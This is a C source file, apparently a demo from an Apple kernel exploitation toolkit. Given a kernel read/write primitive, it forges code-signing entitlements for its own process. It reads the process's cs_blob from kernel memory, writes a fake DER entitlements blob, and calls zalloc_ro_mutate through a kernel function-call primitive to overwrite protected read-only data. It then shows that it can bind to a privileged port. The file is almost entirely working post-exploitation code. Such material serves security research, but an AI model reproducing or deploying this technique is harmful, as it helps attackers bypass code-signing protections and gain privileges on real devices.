
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>
#include <limits.h>
#include <spawn.h>
#include <signal.h>
#include <crt_externs.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include <CoreFoundation/CoreFoundation.h>
#include <IOSurface/IOSurface.h>
#include <Kernel/kern/cs_blobs.h>

#include <xpl/xpl.h>
#include <xpl/memory/kmem.h>
#include <xpl/memory/kmem_remote.h>
#include <xpl/slider/kernel.h>
#include <xpl/xnu/proc.h>
#include <xpl/iokit/io_surface.h>
#include <xpl/iokit/os_dictionary.h>
#include <xpl/util/ptrauth.h>
#include <xpl/util/log.h>
#include <xpl/util/assert.h>
#include <xpl/util/kfunc.h>
#include <xpl/util/binary.h>
#include <xpl/allocator/small_mem.h>

#include "core_entitlements.h"


void print_usage(void) {
    xpl_log_info("usage: demo_entitlements <path-to-kmem>");
}


CFDictionaryRef parse_entitlement_plist(const char* plist_path) {
    CFStringRef path_str = CFStringCreateWithCString(kCFAllocatorDefault, plist_path, kCFStringEncodingUTF8);
    xpl_assert(path_str != NULL);
    
    CFURLRef path = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, path_str, kCFURLPOSIXPathStyle, FALSE);
    if (!path) {
        xpl_log_error("invalid path %s", plist_path);
        exit(1);
    }
    
    CFReadStreamRef stream = CFReadStreamCreateWithFile(kCFAllocatorDefault, path);
    if (!stream || !CFReadStreamOpen(stream)) {
        xpl_log_error("cannot open plist file at path %s", plist_path);
        exit(1);
    }
    
    CFErrorRef parse_error;
    CFDictionaryRef dict = CFPropertyListCreateWithStream(kCFAllocatorDefault, stream, 0, 0, NULL, &parse_error);
    if (!dict) {
        xpl_log_error("failed to parse entitlement plist, err: %s", CFStringGetCStringPtr(CFErrorCopyDescription(parse_error), kCFStringEncodingUTF8));
        CFRelease(parse_error);
        exit(1);
    }
    
    CFReadStreamClose(stream);
    CFRelease(stream);
    CFRelease(path_str);
    CFRelease(path);
    return dict;
}


uintptr_t get_proc_cs_blobs(uintptr_t proc) {
    uintptr_t textvp = xpl_ptrauth_strip(xpl_kmem_read_uint64(proc, TYPE_PROC_MEM_P_TEXTVP_OFFSET));
    uintptr_t ubc_info = xpl_ptrauth_strip(xpl_kmem_read_uint64(textvp, TYPE_VNODE_MEM_VN_UN_OFFSET));
    uintptr_t cs_blobs = xpl_kmem_read_uint64(ubc_info, TYPE_UBC_INFO_MEM_CS_BLOBS_OFFSET);
    return cs_blobs;
}


void mutate_csblob_entilements_der(xpl_kfunc_t kfunc, uintptr_t cs_blob, uintptr_t new_der, uintptr_t new_hash_type) {
    uintptr_t temp_buffer;
    xpl_allocator_small_mem_t allocator = xpl_allocator_small_mem_allocate(TYPE_CS_BLOB_SIZE, &temp_buffer);
    xpl_kmem_copy(temp_buffer, cs_blob, TYPE_CS_BLOB_SIZE);
    xpl_kmem_write_uint64(temp_buffer, TYPE_CS_BLOB_MEM_CSB_DER_ENTITLEMENTS_BLOB_OFFSET, new_der);
    xpl_kmem_write_uint64(temp_buffer, TYPE_CS_BLOB_MEM_CSB_HASHTYPE_OFFSET, new_hash_type);
    
    uint64_t args[8];
    bzero(args, sizeof(args));
    args[0] = 8;  /// zone index
    args[1] = cs_blob;
    args[2] = 0; /// offset
    args[3] = temp_buffer;
    args[4] = TYPE_CS_BLOB_SIZE;
    
    uintptr_t zalloc_ro_mutate = xpl_slider_kernel_slide(FUNC_ZALLOC_RO_MUTATE_ADDR);
    xpl_kfunc_execute_simple(kfunc, zalloc_ro_mutate, args);
    
    xpl_allocator_small_mem_destroy(&allocator);
}


int main(int argc, const char * argv[]) {
    const char* kmem_socket = XPL_DEFAULT_KMEM_SOCKET;
    
    int ch;
    while ((ch = getopt(argc, (char**)argv, "k:")) != -1) {
        switch (ch) {
            case 'k': {
                kmem_socket = optarg;
                break;
            }
            case '?':
            default: {
                xpl_log_info("usage: demo_entitlements [-k kmem_uds]");
                exit(1);
            }
        }
    }
    
    xpl_init();
    xpl_kmem_backend_t remote;
    int error = xpl_kmem_remote_client_create(kmem_socket, &remote);
    if (error) {
        xpl_log_error("cannot connect to kmem unix domain socket %s, err: %s", kmem_socket, strerror(error));
        exit(1);
    }
    
    xpl_kmem_use_backend(remote);
    xpl_slider_kernel_init(xpl_kmem_remote_client_get_mh_execute_header(remote));
    
    int fd = socket(PF_INET, SOCK_STREAM, 0);
    xpl_assert_errno(fd < 0);
    
    struct sockaddr_in addr;
    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_len = sizeof(addr);
    addr.sin_port = htons(55555);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    
    int res = bind(fd, (struct sockaddr*)&addr, sizeof(addr));
    if (res) {
        xpl_log_info("bind to privileged port 55555 failed as expected, err: %s", strerror(errno));
    } else {
        xpl_log_error("bind succeeded without entitlement");
        exit(1);
    }
    
    CFDictionaryRef entitlements = parse_entitlement_plist("entitlements.plist");
    
    uintptr_t proc = xpl_proc_current_proc();
    xpl_log_debug("proc: %p", (void*)proc);
    uintptr_t cs_blob = get_proc_cs_blobs(proc);
    xpl_log_debug("cs_blob: %p", (void*)cs_blob);
    uintptr_t cs_der_entitlements_blob = xpl_kmem_read_uint64(cs_blob, TYPE_CS_BLOB_MEM_CSB_DER_ENTITLEMENTS_BLOB_OFFSET);
    xpl_log_debug("cs_der_entitlements_blob: %p", (void*)cs_der_entitlements_blob);
    uintptr_t csb_hashtype = xpl_kmem_read_uint64(cs_blob, TYPE_CS_BLOB_MEM_CSB_HASHTYPE_OFFSET);
    xpl_log_debug("csb_hashtype: %p", (void*)csb_hashtype);
    
    CFDataRef fake_der_blob_data;
    uint64_t ce_res = CESerializeCFDictionary(CECRuntime, entitlements, &fake_der_blob_data);
    if (ce_res != kCENoError) {
        xpl_log_error("failed to serialize provided entitlements plist");
        exit(1);
    }
    
    size_t fake_der_blob_size = offsetof(CS_GenericBlob, data) + CFDataGetLength(fake_der_blob_data);
    uintptr_t fake_der_blob;
    xpl_allocator_small_mem_t fake_der_allocator = xpl_allocator_small_mem_allocate(fake_der_blob_size, &fake_der_blob);
    
    xpl_kmem_write_uint32(fake_der_blob, offsetof(CS_GenericBlob, magic), htonl(CSMAGIC_EMBEDDED_DER_ENTITLEMENTS));
    xpl_kmem_write_uint32(fake_der_blob, offsetof(CS_GenericBlob, length), htonl(fake_der_blob_size));
    xpl_kmem_write(fake_der_blob, offsetof(CS_GenericBlob, data), (void*)CFDataGetBytePtr(fake_der_blob_data), CFDataGetLength(fake_der_blob_data));
    CFRelease(fake_der_blob_data);
    xpl_log_debug("fake csb_der_entitlements_blob: %p", (void*)fake_der_blob);
    
    uintptr_t fake_csb_hashtype;
    xpl_allocator_small_mem_t fake_csb_hashtype_allocator = xpl_allocator_small_mem_allocate(TYPE_CS_HASH_SIZE, &fake_csb_hashtype);
    xpl_kmem_copy(fake_csb_hashtype, csb_hashtype, TYPE_CS_HASH_SIZE);
    xpl_kmem_write_uint64(fake_csb_hashtype, TYPE_CS_HASH_MEM_CS_SIZE_OFFSET, 0);
    xpl_log_debug("fake csb_hashtype: %p", (void*)fake_csb_hashtype);
    
    xpl_kfunc_t kfunc = xpl_kfunc_create(VAR_ZONE_ARRAY_LEN - 1);
    
    xpl_log_info("setting fake entitlements and hashtype");
    mutate_csblob_entilements_der(kfunc, cs_blob, fake_der_blob, fake_csb_hashtype);
    xpl_log_info("fake entitlements and hashtype set");
    
    res = bind(fd, (struct sockaddr*)&addr, sizeof(addr));
    if (res) {
        xpl_log_error("bind failed even after adding entitlement");
        exit(1);
    } else {
        xpl_log_info("bind to privileged port succeded after adding entitlement");
    }
    
    close(fd);
    
    xpl_log_info("restoring entitlements and hashtype");
    mutate_csblob_entilements_der(kfunc, cs_blob, cs_der_entitlements_blob, csb_hashtype);
    xpl_log_info("restored entitlements and hashtype");
    
    xpl_allocator_small_mem_destroy(&fake_der_allocator);
    xpl_allocator_small_mem_destroy(&fake_csb_hashtype_allocator);
    xpl_kfunc_destroy(&kfunc);
    return 0;
}
